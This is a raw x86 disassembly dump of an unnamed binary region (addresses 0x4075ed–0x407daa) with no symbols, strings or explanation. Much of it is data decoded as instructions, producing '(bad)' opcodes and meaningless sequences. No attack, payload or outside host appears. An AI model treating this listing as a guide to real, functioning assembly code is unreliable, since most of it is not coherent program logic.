  4075ed:	add    ebx,DWORD PTR [edx+esi*4-0x4daf890b]
  4075f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075f5:	add    eax,DWORD PTR [edx+0x50770db2]
  4075fb:	mov    dl,0x56
  4075fd:	add    edi,DWORD PTR [esi-0x4e]
  407600:	icebp  
  407601:	jbe    0x407653
  407603:	mov    dl,0x7e
  407605:	add    ebx,DWORD PTR [esi+0x507719b2]
  40760b:	mov    dl,0xe4
  40760d:	add    ebx,DWORD PTR [ebp+0x507701b2]
  407613:	mov    dl,0x60
  407615:	add    esp,DWORD PTR [eax-0x4e]
  407618:	imul   esi,DWORD PTR [esi+0x50],0x8f0413b2
  40761f:	mov    dl,0x4d
  407621:	jbe    0x4075f3
  407623:	mov    dl,0xcf
  407625:	add    ebx,DWORD PTR [ecx-0x2f895a4e]
  40762b:	mov    dl,0x3a
  40762d:	add    ecx,DWORD PTR [edx-0x2f89de4e]
  407633:	mov    dl,0x3a
  407635:	add    eax,DWORD PTR [eax]
  407637:	add    BYTE PTR [eax],al
  407639:	add    BYTE PTR [eax],al
  40763b:	mov    ds:0xd0763db2,al
  407640:	mov    dl,0xd9
  407642:	add    ecx,DWORD PTR [esi-0x2f901e4e]
  407648:	mov    dl,0xb2
  40764a:	add    edx,DWORD PTR [edx+esi*4-0x4d2f9027]
  407651:	popf   
  407652:	add    ebx,DWORD PTR [edx+esi*4-0x4d2f9037]
  407659:	out    dx,eax
  40765a:	add    edx,DWORD PTR [esi-0x2f903e4e]
  407660:	mov    dl,0x85
  407662:	add    edx,DWORD PTR [ebx+0x506fa1b2]
  407668:	mov    dl,0xe
  40766a:	lds    edx,FWORD PTR [ebx+0x6f990eae]
  407670:	repnz push cs
  407672:	leave  
  407673:	mov    WORD PTR [esi-0xd9fbef2],gs
  407679:	push   cs
  40767a:	repnz xchg ebx,eax
  40767c:	lods   eax,DWORD PTR ds:[esi]
  40767d:	push   cs
  40767e:	dec    ecx
  40767f:	pusha  
  407680:	repnz push cs
  407682:	call   0xf240:0x510ea98c
  407689:	push   cs
  40768a:	pushf  
  40768b:	mov    WORD PTR [ebx-0xdbfcaf2],gs
  407691:	push   cs
  407692:	inc    ecx
  407693:	mov    WORD PTR [edi-0xddf96f2],gs
  407699:	push   cs
  40769a:	cmp    eax,0x610eae8c
  40769f:	add    BYTE PTR [eax],al
  4076a1:	add    BYTE PTR [eax],al
  4076a3:	add    BYTE PTR [eax],ah
  4076a5:	repnz push cs
  4076a7:	(bad)  
  4076a8:	xchg   ebx,eax
  4076a9:	mov    ah,0xe
  4076ab:	pop    ecx
  4076ac:	add    bl,dh
  4076ae:	push   cs
  4076af:	lods   al,BYTE PTR ds:[esi]
  4076b0:	mov    WORD PTR [esi-0xcffaaf2],gs
  4076b6:	push   cs
  4076b7:	iret   
  4076b8:	xchg   ebx,eax
  4076b9:	mov    esi,0xf2e07d0e
  4076be:	push   cs
  4076bf:	fwait
  4076c0:	mov    edi,ss
  4076c2:	push   cs
  4076c3:	xchg   ebp,eax
  4076c4:	loopne 0x4076b8
  4076c6:	push   cs
  4076c7:	pop    eax
  4076c8:	mov    WORD PTR [edi-0xd3fcaf2],gs
  4076ce:	push   cs
  4076cf:	mov    eax,ds:0x2d0ec593
  4076d4:	shl    dl,0xe
  4076d7:	add    eax,0xcd0eaf8c
  4076dc:	mov    esi,0x8c300ef2
  4076e1:	scas   eax,DWORD PTR es:[edi]
  4076e2:	push   cs
  4076e3:	aad    0xae
  4076e5:	repnz push cs
  4076e7:	add    BYTE PTR [edx-0x4e],dl
  4076ea:	add    BYTE PTR [eax],al
  4076ec:	dec    ebp
  4076ed:	add    eax,0xb1cf004f
  4076f2:	add    eax,0x4f051d00
  4076f7:	add    BYTE PTR ds:0x510008b2,cl
  4076fd:	add    eax,0xb209004f
  407702:	or     DWORD PTR [eax],eax
  407704:	dec    ecx
  407705:	add    eax,0x4f
  40770a:	add    BYTE PTR [eax],al
  40770c:	add    BYTE PTR [edx+0x61000bae],ah
  407712:	add    eax,0xb1ac004f
  407717:	sbb    eax,DWORD PTR [eax]
  407719:	jge    0x407720
  40771b:	dec    edi
  40771c:	add    ah,al
  40771e:	mov    cl,0x31
  407720:	add    BYTE PTR [ecx],bh
  407722:	add    al,0x4f
  407724:	add    BYTE PTR [edi-0x16fffb4f],ch
  40772a:	add    al,0x4f
  40772c:	add    bh,dh
  40772e:	mov    cl,0x8
  407730:	add    BYTE PTR ds:0x58004f04,bh
  407736:	mov    cl,0x8
  407738:	add    BYTE PTR ds:0xfa004f04,ah
  40773e:	mov    cl,0x5
  407740:	add    BYTE PTR [ebp-0x76ffb0fc],ch
  407746:	scas   al,BYTE PTR es:[edi]
  407747:	or     al,BYTE PTR [eax]
  407749:	rol    DWORD PTR [edi+ecx*2],1
  40774c:	add    BYTE PTR [ebx-0x4f],bh
  40774f:	push   es
  407750:	add    BYTE PTR [ecx+0x75004f04],cl
  407756:	mov    cl,0xff
  407758:	jmp    FWORD PTR [ebp+0x4]
  40775b:	dec    edi
  40775c:	add    BYTE PTR [ecx+0x3d0007b1],cl
  407762:	and    ecx,DWORD PTR [edi+0x0]
  407765:	nop
  407766:	pop    ebp
  407767:	or     al,0xc
  407769:	nop
  40776a:	lahf   
  40776b:	jle    0x4077ad
  40776d:	nop
  40776e:	jl     0x40777c
  407770:	or     DWORD PTR [eax],eax
  407772:	add    BYTE PTR [eax],al
  407774:	add    BYTE PTR [eax],al
  407776:	nop
  407777:	outs   dx,DWORD PTR ds:[esi]
  407778:	jle    0x4077ba
  40777a:	nop
  40777b:	and    DWORD PTR [edx+ecx*1],ecx
  40777e:	nop
  40777f:	pop    ebx
  407780:	jle    0x4077c2
  407782:	nop
  407783:	push   ds
  407784:	or     eax,DWORD PTR [eax+edx*4]
  407787:	mov    bh,0x60
  407789:	inc    eax
  40778a:	nop
  40778b:	fisttp WORD PTR [edx]
  40778d:	inc    esi
  40778e:	xchg   ecx,eax
  40778f:	shl    DWORD PTR [eax+0x40],cl
  407792:	nop
  407793:	push   ss
  407794:	or     edx,DWORD PTR [ebp-0x70]
  407797:	sti    
  407798:	pop    edi
  407799:	inc    eax
  40779a:	nop
  40779b:	ror    BYTE PTR [edx],1
  40779d:	sub    DWORD PTR [eax-0x6fbf9f8d],edx
  4077a3:	xchg   ecx,eax
  4077a4:	or     al,0xa
  4077a6:	nop
  4077a7:	lahf   
  4077a8:	fs inc eax
  4077aa:	nop
  4077ab:	jbe    0x4077b9
  4077ad:	xor    edx,DWORD PTR [eax-0x6fbf9b95]
  4077b3:	repz or al,BYTE PTR [edi]
  4077b6:	nop
  4077b7:	mov    ebp,0xda904062
  4077bc:	or     cl,BYTE PTR [ecx]
  4077be:	nop
  4077bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077c0:	bound  eax,QWORD PTR [eax-0x70]
  4077c3:	pushf  
  4077c4:	or     al,0x2c
  4077c6:	nop
  4077c7:	and    DWORD PTR [eax+eax*2-0x70],0x900c0c9e
  4077cf:	and    DWORD PTR [ebx+0x40],esp
  4077d2:	nop
  4077d3:	cmp    cl,BYTE PTR [esp+eax*2]
  4077d6:	nop
  4077d7:	inc    ecx
  4077d8:	arpl   WORD PTR [eax+0x0],ax
  4077db:	add    BYTE PTR [eax],al
  4077dd:	add    BYTE PTR [eax],al
  4077df:	nop
  4077e0:	and    eax,0xd990040b
  4077e5:	bound  eax,QWORD PTR [eax-0x70]
  4077e8:	mov    dl,0xa7
  4077ea:	add    edx,DWORD PTR [edx+esi*4-0x4d2f93d3]
  4077f1:	jge    0x4077f7
  4077f3:	mov    dh,BYTE PTR [edx-0x4d2f931b]
  4077f9:	xchg   BYTE PTR [ebx],al
  4077fb:	xchg   esi,eax
  4077fc:	mov    dl,0xe1
  4077fe:	ins    BYTE PTR es:[edi],dx
  4077ff:	push   eax
  407800:	mov    dl,0x9c
  407802:	add    esi,DWORD PTR [esi+0x506cd9b2]
  407808:	mov    dl,0x96
  40780a:	add    edx,DWORD PTR [ebp+0x506d11b2]
  407810:	mov    dl,0x92
  407812:	add    edx,DWORD PTR [edi+0x506d29b2]
  407818:	mov    dl,0xb5
  40781a:	add    edx,DWORD PTR [ebx+0x506d21b2]
  407820:	mov    dl,0x28
  407822:	add    al,0xa7
  407824:	mov    dl,0x15
  407826:	ins    DWORD PTR es:[edi],dx
  407827:	push   eax
  407828:	mov    dl,0x13
  40782a:	add    al,0x9f
  40782c:	mov    dl,0x1d
  40782e:	ins    DWORD PTR es:[edi],dx
  40782f:	push   eax
  407830:	mov    dl,0x20
  407832:	add    al,0x95
  407834:	mov    dl,0x1d
  407836:	ins    DWORD PTR es:[edi],dx
  407837:	push   eax
  407838:	mov    dl,0xb7
  40783a:	add    esp,DWORD PTR [edx+esi*4-0x4d2f939b]
  407841:	inc    esi
  407842:	add    eax,DWORD PTR [eax]
  407844:	add    BYTE PTR [eax],al
  407846:	add    BYTE PTR [eax],al
  407848:	sahf   
  407849:	mov    dl,0x5d
  40784b:	ins    BYTE PTR es:[edi],dx
  40784c:	shl    BYTE PTR [edx-0x4d68fc43],1
  407852:	lods   eax,DWORD PTR ds:[esi]
  407853:	ins    BYTE PTR es:[edi],dx
  407854:	shl    BYTE PTR [edx-0x4d7ffbf1],1
  40785a:	and    eax,0xd8b2d06c
  40785f:	add    edx,DWORD PTR [esi-0x2f93e64e]
  407865:	mov    dl,0xe
  407867:	xchg   edi,eax
  407868:	xchg   ebx,eax
  407869:	scas   eax,DWORD PTR es:[edi]
  40786a:	push   cs
  40786b:	or     eax,0x8b0ef2a4
  407870:	xchg   ebx,eax
  407871:	ret    
  407872:	push   cs
  407873:	or     DWORD PTR [edx+esi*8-0x446c9df2],esi
  40787a:	push   cs
  40787b:	stc    
  40787c:	test   eax,0x93a30ef2
  407881:	mov    eax,0xf279d10e
  407886:	push   cs
  407887:	push   cs
  407888:	xchg   ebx,eax
  407889:	mov    ds:0xf269a50e,eax
  40788e:	push   cs
  40788f:	cwde   
  407890:	xchg   esp,eax
  407891:	mov    esi,0xf27a350e
  407896:	push   cs
  407897:	push   esi
  407898:	xchg   esp,eax
  407899:	mov    bl,0xe
  40789b:	cmp    eax,0xe40ef26a
  4078a0:	xchg   ebx,eax
  4078a1:	into   
  4078a2:	push   cs
  4078a3:	ins    DWORD PTR es:[edi],dx
  4078a4:	cmp    dh,dl
  4078a6:	push   cs
  4078a7:	fwait
  4078a8:	xchg   esp,eax
  4078a9:	test   al,0xe
  4078ab:	jne    0x4078ad
  4078ad:	add    BYTE PTR [eax],al
  4078af:	add    BYTE PTR [eax],al
  4078b1:	sub    dh,dl
  4078b3:	push   cs
  4078b4:	mov    dl,BYTE PTR [esi+ebp*4-0xdc556f2]
  4078bb:	push   cs
  4078bc:	in     al,dx
  4078bd:	xchg   ebx,eax
  4078be:	scas   al,BYTE PTR es:[edi]
  4078bf:	push   cs
  4078c0:	mov    eax,ds:0x7c0ef22a
  4078c5:	xchg   esp,eax
  4078c6:	mov    esi,0xf2fa990e
  4078cb:	push   cs
  4078cc:	pop    ebx
  4078cd:	xchg   esp,eax
  4078ce:	mov    ds:0xf2ea890e,eax
  4078d3:	push   cs
  4078d4:	call   DWORD PTR [ebx-0x5aaf140]
  4078da:	repnz push cs
  4078dc:	scas   al,BYTE PTR es:[edi]
  4078dd:	xchg   ebx,eax
  4078de:	mov    esi,0xf2e8e50e
  4078e3:	push   cs
  4078e4:	add    BYTE PTR [eax],cl
  4078e6:	mov    dh,0x1c
  4078e8:	add    BYTE PTR [ebp+0x1b],bl
  4078eb:	dec    edi
  4078ec:	add    cl,al
  4078ee:	mov    dh,0x10
  4078f0:	add    BYTE PTR [ecx+0x67004f1b],dl
  4078f6:	mov    dh,0x3d
  4078f8:	add    cl,ah
  4078fa:	sbb    cl,BYTE PTR [edi+0x0]
  4078fd:	nop
  4078fe:	mov    dh,0x5
  407900:	add    BYTE PTR ds:0x8c004f1b,al
  407906:	mov    ch,0x2
  407908:	add    BYTE PTR [ecx-0x27ffb0e5],al
  40790e:	mov    ch,0x2
  407910:	add    BYTE PTR [ecx+0x1b],ah
  407913:	dec    edi
  407914:	add    BYTE PTR [eax],al
  407916:	add    BYTE PTR [eax],al
  407918:	add    BYTE PTR [eax],al
  40791a:	gs mov ch,0x7
  40791d:	add    BYTE PTR [ecx],al
  40791f:	sbb    ecx,DWORD PTR [edi+0x0]
  407922:	add    BYTE PTR [esi+0x1af9001a],dh
  407928:	dec    edi
  407929:	add    BYTE PTR ds:0x1000ab6,cl
  40792f:	sbb    ecx,DWORD PTR [edi+0x0]
  407932:	fidiv  DWORD PTR [ebp+0x1b19000a]
  407938:	dec    edi
  407939:	add    BYTE PTR ds:0xd1000ab6,al
  40793f:	sbb    cl,BYTE PTR [edi+0x0]
  407942:	mov    ecx,0x90008b5
  407947:	sbb    ecx,DWORD PTR [edi+0x0]
  40794a:	in     eax,0xb5
  40794c:	add    al,BYTE PTR [eax]
  40794e:	and    DWORD PTR [edx],ebx
  407950:	dec    edi
  407951:	add    BYTE PTR [esi-0x4b],ah
  407954:	or     al,BYTE PTR [eax]
  407956:	add    DWORD PTR [ebx],ebx
  407958:	dec    edi
  407959:	add    BYTE PTR [esi*4+0x19790010],bl
  407960:	dec    edi
  407961:	add    BYTE PTR [eax-0x6ff8f3f5],dl
  407967:	mov    ebx,0x8a904066
  40796c:	or     al,0xf
  40796e:	nop
  40796f:	mov    ds:0xf1904066,eax
  407974:	or     eax,DWORD PTR [esi]
  407976:	nop
  407977:	sub    DWORD PTR [eax+0x40],0xffffff90
  40797b:	fs or  al,0x4
  40797e:	add    BYTE PTR [eax],al
  407980:	add    BYTE PTR [eax],al
  407982:	add    BYTE PTR [eax-0x6fbf97a5],dl
  407988:	outs   dx,BYTE PTR ds:[esi]
  407989:	or     al,0x6
  40798b:	nop
  40798c:	push   ebx
  40798d:	push   0xc829040
  407992:	or     DWORD PTR [eax-0x6fbf97d5],edx
  407998:	call   0x4068:0x3f900c0c
  40799f:	nop
  4079a0:	pop    es
  4079a1:	or     ecx,DWORD PTR [eax]
  4079a3:	nop
  4079a4:	jmp    FWORD PTR [esi+0xaa89040]
  4079aa:	or     al,0x90
  4079ac:	jecxz  0x40795c
  4079ae:	inc    eax
  4079af:	nop
  4079b0:	sub    cl,BYTE PTR [ebx]
  4079b2:	or     edx,DWORD PTR [eax-0x6fbf50fd]
  4079b8:	mov    bh,0xa
  4079ba:	or     DWORD PTR [eax-0x6fbf5119],edx
  4079c0:	push   ebx
  4079c1:	or     ecx,DWORD PTR ds:0x40aefb90
  4079c7:	nop
  4079c8:	jne    0x4079d6
  4079ca:	or     dl,BYTE PTR [eax-0x6fbf5115]
  4079d0:	sahf   
  4079d1:	or     al,0xd
  4079d3:	nop
  4079d4:	int    0xae
  4079d6:	inc    eax
  4079d7:	nop
  4079d8:	add    BYTE PTR [ebx],cl
  4079da:	push   ss
  4079db:	nop
  4079dc:	sub    eax,0xb29040af
  4079e1:	and    al,0x4
  4079e3:	jge    0x407997
  4079e5:	dec    ecx
  4079e6:	mov    al,ds:0x0
  4079eb:	add    al,dl
  4079ed:	mov    dl,0xd3
  4079ef:	add    edi,DWORD PTR [edx+esi*4+0x41]
  4079f3:	mov    al,ds:0x475b2d0
  4079f8:	xchg   edi,eax
  4079f9:	mov    dl,0xd9
  4079fb:	mov    al,ds:0x432b2d0
  407a00:	test   BYTE PTR [edx-0x4d2f5ef7],dh
  407a06:	and    BYTE PTR [esp+edx*4],al
  407a09:	mov    dl,0xd9
  407a0b:	mov    al,ds:0x470b2d0
  407a10:	mov    esi,DWORD PTR [edx-0x4daf5f57]
  407a16:	rol    BYTE PTR [ebx],1
  407a18:	xchg   esp,eax
  407a19:	mov    dl,0x95
  407a1b:	mov    al,ds:0x3f3b250
  407a20:	mov    al,ds:0x50a085b2
  407a25:	mov    dl,0x1c
  407a27:	add    al,0x83
  407a29:	mov    dl,0x59
  407a2b:	mov    eax,ds:0x40eb250
  407a30:	xchg   BYTE PTR [edx-0x4daf5f93],dh
  407a36:	dec    edx
  407a37:	add    al,0xa1
  407a39:	mov    dl,0x6d
  407a3b:	mov    al,ds:0x41fb250
  407a40:	xchg   BYTE PTR [edx-0x4daf5f8f],dh
  407a46:	in     eax,dx
  407a47:	add    eax,DWORD PTR [eax+0x50a051b2]
  407a4d:	mov    dl,0xd8
  407a4f:	add    eax,DWORD PTR [eax]
  407a51:	add    BYTE PTR [eax],al
  407a53:	add    BYTE PTR [eax],al
  407a55:	xor    DWORD PTR [edx-0x4d2f5f4b],0xb29d03ca
  407a5f:	mov    DWORD PTR [eax+0x2c0eb2d0],esp
  407a65:	mov    WORD PTR [esi-0xdcf92f2],fs
  407a6b:	push   cs
  407a6c:	scas   al,BYTE PTR es:[edi]
  407a6d:	xchg   ebx,eax
  407a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a6f:	push   cs
  407a70:	cmc    
  407a71:	xor    edx,esi
  407a73:	push   cs
  407a74:	mov    ecx,0xfd0ea493
  407a79:	icebp  
  407a7a:	icebp  
  407a7b:	push   cs
  407a7c:	in     eax,0x93
  407a7e:	stos   BYTE PTR es:[edi],al
  407a7f:	push   cs
  407a80:	test   eax,0x90ef1f1
  407a85:	mov    WORD PTR [ecx-0xe0e72f2],gs
  407a8b:	push   cs
  407a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a8d:	xchg   ebx,eax
  407a8e:	ror    DWORD PTR [esi],cl
  407a90:	mov    eax,ds:0x920ef1f1
  407a95:	xchg   ebx,eax
  407a96:	aad    0xe
  407a98:	ins    DWORD PTR es:[edi],dx
  407a99:	xor    edx,esi
  407a9b:	push   cs
  407a9c:	pop    edx
  407a9d:	xchg   ebx,eax
  407a9e:	stos   DWORD PTR es:[edi],eax
  407a9f:	push   cs
  407aa0:	and    eax,0x800ef231
  407aa5:	xchg   ebx,eax
  407aa6:	mov    bl,0xe
  407aa8:	or     DWORD PTR [ecx],esi
  407aaa:	repnz push cs
  407aac:	adc    al,0x8c
  407aae:	mov    bh,0xe
  407ab0:	lds    esi,FWORD PTR [edx]
  407ab2:	repnz push cs
  407ab4:	cwde   
  407ab5:	mov    WORD PTR [edi+0xbd0e],?
  407abb:	add    BYTE PTR [eax],al
  407abd:	add    dl,dh
  407abf:	icebp  
  407ac0:	push   cs
  407ac1:	xchg   ebx,eax
  407ac2:	mov    WORD PTR [esi-0xe0d4af2],gs
  407ac8:	push   cs
  407ac9:	jmp    0xf1f0:0xd50eb793
  407ad0:	push   cs
  407ad1:	jne    0x407a5f
  407ad3:	mov    esp,0xf1f0fd0e
  407ad8:	push   cs
  407ad9:	jae    0x407a67
  407adb:	dec    BYTE PTR [esi]
  407add:	shl    DWORD PTR [eax],0xf3
  407ae0:	push   cs
  407ae1:	add    BYTE PTR [ecx-0x6effd34a],bl
  407ae7:	push   ebx
  407ae8:	dec    edi
  407ae9:	add    BYTE PTR [ecx-0x4e],bh
  407aec:	and    BYTE PTR [eax],al
  407aee:	fst    QWORD PTR [ebx+0x4f]
  407af1:	add    BYTE PTR [ebp-0x52fff54a],cl
  407af7:	push   ebx
  407af8:	dec    edi
  407af9:	add    BYTE PTR [edx-0x7affe44a],cl
  407aff:	push   ebx
  407b00:	dec    edi
  407b01:	add    bh,bl
  407b03:	mov    dh,0x1a
  407b05:	add    cl,ah
  407b07:	push   ebx
  407b08:	dec    edi
  407b09:	add    BYTE PTR [eax-0x4a],dh
  407b0c:	adc    BYTE PTR [eax],al
  407b0e:	cmp    DWORD PTR [edx],edx
  407b10:	dec    edi
  407b11:	add    BYTE PTR [edi+0x490011b6],bh
  407b17:	adc    cl,BYTE PTR [edi+0x0]
  407b1a:	mov    ds:0x39002eb6,eax
  407b1f:	adc    cl,BYTE PTR [edi+0x0]
  407b22:	add    BYTE PTR [eax],al
  407b24:	add    BYTE PTR [eax],al
  407b26:	add    dl,dh
  407b28:	mov    cl,0x67
  407b2a:	add    BYTE PTR [ecx],ah
  407b2c:	adc    cl,BYTE PTR [edi+0x0]
  407b2f:	inc    edi
  407b30:	mov    dh,0x9
  407b32:	add    BYTE PTR [ecx-0x4ffb0ea],cl
  407b38:	mov    cl,0x4
  407b3a:	add    cl,dl
  407b3c:	adc    DWORD PTR [edi+0x0],ecx
  407b3f:	retf   0x35b1
  407b42:	add    ch,dl
  407b44:	adc    DWORD PTR [edi+0x0],ecx
  407b47:	and    eax,0x890021b2
  407b4c:	adc    DWORD PTR [edi+0x0],ecx
  407b4f:	shl    BYTE PTR [ecx+0x11890007],0x4f
  407b56:	add    bh,bh
  407b58:	mov    cl,0x2
  407b5a:	add    BYTE PTR [ecx+0x11],dl
  407b5d:	dec    edi
  407b5e:	add    BYTE PTR [eax-0x6ff4f52e],dl
  407b64:	mov    bl,0x6b
  407b66:	inc    eax
  407b67:	nop
  407b68:	sub    al,0xc
  407b6a:	or     edx,DWORD PTR [eax-0x6fbf9279]
  407b70:	mov    ecx,0x1b900a0a
  407b75:	ins    DWORD PTR es:[edi],dx
  407b76:	inc    eax
  407b77:	nop
  407b78:	jle    0x407b86
  407b7a:	or     edx,DWORD PTR [eax-0x6fbf92e1]
  407b80:	dec    ebp
  407b81:	or     al,0xc
  407b83:	nop
  407b84:	add    ebp,DWORD PTR [ebp+0x40]
  407b87:	nop
  407b88:	cmp    DWORD PTR [esp+ebp*1],ecx
  407b8b:	add    BYTE PTR [eax],al
  407b8d:	add    BYTE PTR [eax],al
  407b8f:	add    BYTE PTR [eax-0x6fbf92dd],dl
  407b95:	imul   ecx,DWORD PTR [ebx+ecx*1],0x406ca390
  407b9c:	nop
  407b9d:	int3   
  407b9e:	or     edx,DWORD PTR [eax]
  407ba0:	nop
  407ba1:	mov    bh,0x6c
  407ba3:	inc    eax
  407ba4:	nop
  407ba5:	fisttp DWORD PTR [ebx]
  407ba7:	or     edx,DWORD PTR [eax-0x6fbf935d]
  407bad:	fisttp WORD PTR [ebx]
  407baf:	or     edx,DWORD PTR [eax-0x6fbf9569]
  407bb5:	data16 or al,0x7
  407bb8:	nop
  407bb9:	imul   ebp,DWORD PTR [edx+0x40],0xffffff90
  407bbd:	or     eax,0xb390120b
  407bc2:	ins    BYTE PTR es:[edi],dx
  407bc3:	inc    eax
  407bc4:	nop
  407bc5:	test   BYTE PTR [edx],0x26
  407bc8:	nop
  407bc9:	(bad)  
  407bca:	outs   dx,BYTE PTR ds:[esi]
  407bcb:	inc    eax
  407bcc:	nop
  407bcd:	int3   
  407bce:	or     cl,BYTE PTR [eax+edx*4]
  407bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bd2:	ins    BYTE PTR es:[edi],dx
  407bd3:	inc    eax
  407bd4:	nop
  407bd5:	test   BYTE PTR [edx*1+0x406cf790],cl
  407bdc:	nop
  407bdd:	mov    dl,0x15
  407bdf:	add    al,0x8d
  407be1:	mov    dl,0x11
  407be3:	bound  edx,QWORD PTR [eax-0x4e]
  407be6:	inc    edx
  407be7:	add    al,0xa1
  407be9:	mov    dl,0x51
  407beb:	(bad)  
  407bec:	shl    BYTE PTR [edx-0x4d74fc0c],1
  407bf2:	inc    ebp
  407bf3:	bound  eax,QWORD PTR [eax]
  407bf5:	add    BYTE PTR [eax],al
  407bf7:	add    BYTE PTR [eax],al
  407bf9:	shl    BYTE PTR [edx-0x4d70fc38],1
  407bff:	xor    DWORD PTR [edx-0x30],esp
  407c02:	mov    dl,0xa2
  407c04:	add    ecx,DWORD PTR [ecx-0x2f9dde4e]
  407c0a:	mov    dl,0x15
  407c0c:	add    al,0xa3
  407c0e:	mov    dl,0x3d
  407c10:	(bad)  
  407c11:	shl    BYTE PTR [edx-0x4d71fc3f],1
  407c17:	inc    ecx
  407c18:	(bad)  
  407c19:	shl    BYTE PTR [edx-0x4d7dfc42],1
  407c1f:	and    DWORD PTR [edx-0x30],esp
  407c22:	mov    dl,0xb
  407c24:	add    al,0x8c
  407c26:	mov    dl,0xf5
  407c28:	(bad)  
  407c29:	shl    BYTE PTR [edx-0x4d67fba8],1
  407c2f:	lds    esp,FWORD PTR [edx+0x50]
  407c32:	mov    dl,0xea
  407c34:	add    ecx,DWORD PTR [ecx+0x5062c1b2]
  407c3a:	mov    dl,0xa4
  407c3c:	add    ebx,DWORD PTR [edx+0x5062bdb2]
  407c42:	mov    dl,0xf8
  407c44:	add    edx,DWORD PTR [ebx+0x506329b2]
  407c4a:	mov    dl,0x9b
  407c4c:	add    ebx,DWORD PTR [edi+0x50632db2]
  407c52:	mov    dl,0xe5
  407c54:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  407c5a:	mov    dl,0xe
  407c5c:	push   ebx
  407c5d:	add    BYTE PTR [eax],al
  407c5f:	add    BYTE PTR [eax],al
  407c61:	add    BYTE PTR [ebp+0xd],dh
  407c64:	inc    edi
  407c65:	dec    ebp
  407c66:	push   ebx
  407c67:	or     eax,0xce26b747
  407c6c:	jne    0x407ceb
  407c6e:	addr16 or eax,0xeb77447
  407c74:	inc    edi
  407c75:	push   esi
  407c76:	push   edi
  407c77:	aaa    
  407c78:	cmp    ecx,DWORD PTR [eax-0x19fb6191]
  407c7e:	call   0x4c0d:0x264beda3
  407c85:	mov    esi,DWORD PTR [edx+0x4c95f42a]
  407c8b:	mov    al,ds:0x6c75bacd
  407c90:	jo     0x407c4a
  407c92:	ror    BYTE PTR [esi+esi*8-0x69],1
  407c96:	lahf   
  407c97:	aad    0x8b
  407c99:	mov    ebx,0xd446c6d0
  407c9e:	and    ebx,esp
  407ca0:	dec    esp
  407ca1:	inc    ecx
  407ca2:	leave  
  407ca3:	inc    ebp
  407ca4:	lods   eax,DWORD PTR ds:[esi]
  407ca5:	in     al,0x65
  407ca7:	adc    DWORD PTR [ebx-0x4894e7b4],ecx
  407cad:	mov    ah,BYTE PTR [esi]
  407caf:	ins    BYTE PTR es:[edi],dx
  407cb0:	pop    ecx
  407cb1:	and    DWORD PTR [edx],esi
  407cb3:	dec    edx
  407cb4:	call   0xc6f66adb
  407cb9:	scas   eax,DWORD PTR es:[edi]
  407cba:	mov    ah,BYTE PTR [eax-0x1bb1a7bd]
  407cc0:	adc    eax,0xf3e189f1
  407cc5:	or     eax,0x0
  407cca:	add    bh,bl
  407ccc:	repnz sbb eax,0x80ae9951
  407cd2:	mov    eax,ds:0x4da88b5a
  407cd7:	mov    bh,0xf8
  407cd9:	push   edx
  407cda:	push   esi
  407cdb:	xlat   BYTE PTR ds:[ebx]
  407cdc:	dec    esp
  407cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cde:	add    BYTE PTR [esi],al
  407ce0:	mov    bh,0x4c
  407ce2:	mov    eax,0x21ae19ff
  407ce7:	inc    edx
  407ce8:	push   cs
  407ce9:	xchg   ebp,eax
  407cea:	data16 daa 
  407cec:	push   edx
  407ced:	push   0xfea2e50f
  407cf2:	adc    dl,al
  407cf4:	mov    esp,DWORD PTR [esi]
  407cf6:	mov    ds:0x1a3864eb,eax
  407cfb:	jecxz  0x407d78
  407cfd:	xor    BYTE PTR [ecx-0xa],bl
  407d00:	add    eax,0xce99fb01
  407d05:	into   
  407d06:	fsub   QWORD PTR [edi-0x72d60ea2]
  407d0c:	pop    esi
  407d0d:	push   edx
  407d0e:	sbb    edx,esp
  407d10:	adc    bl,BYTE PTR [ebp+edx*8-0xe]
  407d14:	sub    BYTE PTR [edi+ebp*4+0x59],dl
  407d18:	frstor [esi+0x15d475a3]
  407d1e:	mov    cl,BYTE PTR [edx+0x2a]
  407d21:	das    
  407d22:	pushf  
  407d23:	scas   al,BYTE PTR es:[edi]
  407d24:	sbb    cl,dl
  407d26:	lods   al,BYTE PTR ds:[esi]
  407d27:	jbe    0x407d98
  407d29:	pop    esp
  407d2a:	ins    DWORD PTR es:[edi],dx
  407d2b:	jae    0x407d2f
  407d2d:	sbb    bl,BYTE PTR [edx+0x0]
  407d30:	add    BYTE PTR [eax],al
  407d32:	add    BYTE PTR [eax],al
  407d34:	mov    eax,0xbb18e82d
  407d39:	jb     0x407d79
  407d3b:	pop    ebp
  407d3c:	push   0x76bb9b2a
  407d41:	or     eax,0xf51210c1
  407d46:	pop    edx
  407d47:	in     al,0x33
  407d49:	outs   dx,DWORD PTR ds:[esi]
  407d4a:	sahf   
  407d4b:	mov    ebx,0xf2445de0
  407d50:	dec    esi
  407d51:	or     eax,0x4b6631e1
  407d56:	(bad)  
  407d57:	es inc esp
  407d59:	push   es
  407d5a:	mov    ds:0x993f902d,eax
  407d5f:	cdq    
  407d60:	(bad)  
  407d61:	in     al,0x18
  407d63:	add    DWORD PTR [esi+0x49a4c1a],0x69
  407d6a:	mov    bl,0x32
  407d6c:	stos   DWORD PTR es:[edi],eax
  407d6d:	xchg   BYTE PTR [ebx+esi*8+0x4a7c76be],cl
  407d74:	test   al,cl
  407d76:	clc    
  407d77:	jge    0x407d51
  407d79:	fmul   QWORD PTR [ebp-0x5dc9ce71]
  407d7f:	sub    ebp,DWORD PTR [ebp-0x65]
  407d82:	or     al,0x0
  407d84:	nop
  407d85:	push   ebx
  407d86:	or     al,0x0
  407d88:	nop
  407d89:	sbb    ecx,DWORD PTR [esi]
  407d8b:	add    BYTE PTR [eax-0x6ffff38a],dl
  407d91:	and    cl,BYTE PTR [eax+eax*1]
  407d94:	nop
  407d95:	sti    
  407d96:	add    al,BYTE PTR [eax]
  407d98:	add    BYTE PTR [eax],al
  407d9a:	add    BYTE PTR [eax],al
  407d9c:	add    BYTE PTR [eax-0x6ffff552],dl
  407da2:	lds    ecx,FWORD PTR [ebx]
  407da4:	add    BYTE PTR [eax-0x6ffffd05],dl
  407daa:	mov    dh,0xa
